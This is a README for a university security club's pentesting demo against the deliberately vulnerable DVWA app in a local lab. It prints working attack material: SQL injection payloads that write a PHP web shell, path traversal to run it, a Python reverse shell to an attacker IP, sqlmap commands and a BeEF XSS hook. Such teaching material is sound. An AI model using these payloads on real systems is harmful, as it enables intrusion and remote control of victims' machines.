# Abakus Security Demo

This is a simple security / pentesting demo run for Abakus at NTNU in Trondheim.
There are two hosts used in this demo:
```
Victim (Ubuntu 16.04): 192.168.56.101
Attacker (Kali Linux): 192.168.56.102
```
To adopt this demo, simply change those IPs in the examples.

## Disclaimer

DO NOT use the techniques shown here towards live targets on the internet, your friends, or school resources.
Doing so is most likely against the law and is simply not cool, always ask for explicit permission before attempting any form of pentesting! 

# Setup victim machine

This was done on a Ubuntu 16.04 server.

## Install Docker

```
$ sudo apt-get update && apt-get install docker.io
$ sudo systemctl start docker
```

## Setup Damn Vulnerable Web Application (DVWA)

Pull the image from DockerHub:
```
$ sudo docker pull citizenstig/dvwa
```

Fire up the container:
```
$ sudo docker run -d -p 80:80 citizenstig/dvwa:latest
```

1. DVWA is now available at `http://192.168.56.101:80`
2. Follow the instructions to setup the MySQL database within the browser
3. Refresh and login, default username is `admin` and the default password is `password`

# Recon
## google hacking
Popular search operations
`site`, `filetype`, `inurl`, `intitle`

Find hardware with known vulnerabilities
`intitle:"SpeedStream Router Management Interface"`

Web accessible, Open Cisco Routers
`inurl:"level/15/exec/-/show"`

## TheHarvester
Install instructions: https://github.com/laramies/theHarvester

Example command for assessing google
`theharvester -d telenordigital.com -l 500 -b all > telenor-digital.txt`


## nmap
`sudo nmap 127.0.0.1 -sV -sC -O`

```
jogr@Jonnathans-MacBook-Pro: recon_enum (master)*$ sudo nmap 127.0.0.1 -sV -sC -O

Starting Nmap 7.12 ( https://nmap.org ) at 2018-02-21 16:31 CET
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00012s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-git:
|   127.0.0.1:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|_      https://github.com/fermayo/hello-world-lamp.git
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-title: Damn Vulnerable Web App (DVWA) - Login
|_Requested resource was login.php
631/tcp open  ipp     CUPS 2.2
| http-methods:
|_  Potentially risky methods: PUT
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Home - CUPS 2.2.5
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.12%E=4%D=2/21%OT=80%CT=1%CU=32715%PV=N%DS=0%DC=L%G=Y%TM=5A8D910
OS:0%P=x86_64-apple-darwin15.4.0)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=RD%II=RI%
OS:TS=A)OPS(O1=M3FD8NW5NNT11SLL%O2=M3FD8NW5NNT11SLL%O3=M3FD8NW5NNT11%O4=M3F
OS:D8NW5NNT11SLL%O5=M3FD8NW5NNT11SLL%O6=M3FD8NNT11SLL)WIN(W1=FFFF%W2=FFFF%W
OS:3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)ECN(R=Y%DF=Y%T=40%W=FFFF%O=M3FD8NW5SLL%CC
OS:=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=N%T=40%W=0%S=
OS:Z%A=S%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=38%UN=0%RIPL=G%RID=G%RIPCK=Z%
OS:RUCK=0%RUD=G)IE(R=Y%DFI=S%T=40%CD=S)

Network Distance: 0 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.55 seconds
```

# Finding vulnerabilities

## Cross Site Scripting (XSS)

1. Go to `http://192.168.56.101/security.php` and set security level to low.
2. Go to `http://192.168.56.101/vulnerabilities/xss_r/`. Explore the functionality.
3. Reflect on the source code by clicking "View Source" in the bottom right.
4. Play around with some input, does the application reflect `<`, `'`, `"`?
5. Can you put actual HTML tags in there, like `<pre>`, `<a>`?
6. Attempt to use the classic `<script>alert(1)</script>` to check for XSS.
7. Show the same with the persistant/stored XSS at `http://192.168.56.101/vulnerabilities/xss_s/`

## SQL Injection (SQLi)

1. Go to `http://192.168.56.101/security.php` and set security level to low.
2. Go to `http://192.168.56.101/vulnerabilities/sqli/` and explore the functionality
3. View the source by clicking "View Source" in the bottom right.
4. Input a single quote `'` into the input field.
	+ Makes query: `"SELECT first_name, last_name FROM users WHERE user_id = '''";`
5. Input `1' OR 1=1;#` into the input field. 
	+ Makes query: `"SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1;#'";`
6. Demonstrate that arbitrary information can be received:
	+ `1' union select all 1,@@version;#`
	+ `1' union select all 1,table_name FROM information_schema.tables;#`
7. Show that files can be written as well:
	+ `1' union select all 1,"<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/tmp/backdoor.php';#`
8. Take advantage of it with path traversal vulnerability:
	+ `http://192.168.56.101/vulnerabilities/fi/?page=../../../../../tmp/backdoor.php&cmd=id`
9. Run `sqlmap -u "http://192.168.56.101/vulnerabilities/sqli/?id=123&Submit=Submit#"`.
10. Fetch cookie values from CookieManager+
11. Run `sqlmap -u "http://192.168.56.101/vulnerabilities/sqli/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=[SESSION FROM COOKIES]"`
12. Run `sqlmap -u "http://192.168.56.101/vulnerabilities/sqli/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=[SESSION FROM COOKIES]" --tables`

# Exploitation

## Reverse shell using SQLi
1. Want to take advantage of the SQLi and the path traversal vulnerability we found previously.
2. Reflect on why we'd want to use a reverse shell (victim -> attacker) instead of a regular shell (attacker -> victim).
3. Prepare to receive the shell by using a netcat listener on the attacker machine: `nc -l -p 5454`
4. Confirm that python is available on the victim: `http://192.168.56.101/vulnerabilities/fi/?page=../../../../../tmp/backdoor.php&cmd=which python`
5. We'll get the reverse shell using the following Python one-liner:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
6. Execute the reverse shell on the victim: 
```
http://192.168.56.101/vulnerabilities/fi/?page=../../../../../tmp/backdoor.php&cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",5454));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
7. Shell, woo!

## BeEF Command and Control using XSS

1. Fire up BeEF in Kali:
```
root@kali:~# beef-xss
```
2. Open up the BeEF GUI at `http://192.168.56.101:3000/ui/panel` and login with the credentials beef:beef
3. Host a simple HTML page with the following content:
```
root@kali:/var/www/html# cat beef.html 
<html>
<head>
<script src="http://192.168.56.102:3000/hook.js"></script>
</head>
<body>
<h1>Welcome to my awesome page</h1>
<h2>Enjoy your stay!</h2>
</body>
```
4. Get hooked by going to the URI `http://192.168.56.101:3000/beef.html` in a browser of your choosing
5. Show some functionality by selecting `hoooked browser -> Commands -> Browser -> Hooked Domain -> Create Alert Dialog`

# Resources

## Kali Linux
https://www.kali.org/

## Vulnerable applications
1. Damn Vulnerable Web Application: http://www.dvwa.co.uk/
2. WebGoat: https://github.com/WebGoat/WebGoat
3. Mutillidae 2: https://www.owasp.org/index.php/OWASP_Mutillidae_2_Project

## Prevent vulnerabilities:
XSS: https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet

SQL injection: https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
